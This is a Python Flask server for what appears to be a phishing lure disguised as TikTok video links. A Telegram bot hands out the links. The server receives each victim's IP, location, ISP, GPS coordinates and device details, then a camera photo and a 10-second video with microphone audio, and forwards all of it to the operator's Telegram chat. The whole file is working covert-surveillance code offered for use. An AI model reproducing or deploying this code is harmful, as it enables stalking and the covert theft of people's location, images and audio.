from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import requests, base64, os

app = Flask(__name__)
CORS(app)

TELEGRAM_TOKEN = os.environ.get('BOT_TOKEN', '')
TELEGRAM_CHAT_ID = os.environ.get('YOUR_CHAT_ID', '')

@app.route('/collect', methods=['POST'])
def collect():
    data = request.json
    phase = data.get('phase', '')
    bat = data.get('battery', {})
    dev = data.get('device', {})
    net = data.get('network', {})
    con = data.get('connection', {})
    gps = data.get('gps', {})

    if phase == 'phase1':
        msg = f"""📊 DATA COLLECTED
🕐 {data.get('timestamp')}
🆔 {data.get('sessionId')}
🌐 IP: {net.get('ip','?')} | {net.get('city','?')}, {net.get('country','?')}
📡 ISP: {net.get('isp','?')}
📍 GPS: {gps.get('lat','?')}, {gps.get('lon','?')}
📱 {dev.get('platform','?')} | {dev.get('screen','?')}
🔋 {bat.get('level','?')} | 📶 {con.get('type','?')}"""
        try:
            requests.post(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage', json={'chat_id': TELEGRAM_CHAT_ID, 'text': msg})
        except: pass

    elif phase == 'phase2':
        if data.get('photo'):
            try:
                b = base64.b64decode(data['photo'].split(',')[1])
                requests.post(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto', data={'chat_id': TELEGRAM_CHAT_ID, 'caption': '📸 Photo Taken'}, files={'photo': ('photo.jpg', b, 'image/jpeg')})
            except: pass

    elif phase == 'phase3':
        if data.get('video'):
            try:
                v = base64.b64decode(data['video'].split(',')[1])
                requests.post(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendVideo', data={'chat_id': TELEGRAM_CHAT_ID, 'caption': '🎥 10s Recording with Mic'}, files={'video': ('recording.webm', v, 'video/webm')})
            except: pass

    return jsonify({'status': 'ok'})

@app.route('/')
@app.route('/video')
@app.route('/trending')
@app.route('/foryou')
def index():
    return send_from_directory('.', 'webpage.html')

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.json
    if update and 'message' in update:
        chat_id = update['message']['chat']['id']
        text = update['message'].get('text', '')
        if text in ['/start', '/link']:
            msg = """🎵 TikTok Videos

1: https://tiktok-video-production.up.railway.app/trending
2: https://tiktok-video-production.up.railway.app/foryou
3: https://tiktok-video-production.up.railway.app/video

📱 Watch now!"""
            requests.post(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage', json={'chat_id': chat_id, 'text': msg})
    return jsonify({'status': 'ok'})

@app.route('/setup_webhook')
def setup_webhook():
    r = requests.get(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/setWebhook?url=https://tiktok-video-production.up.railway.app/webhook')
    return jsonify(r.json())

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
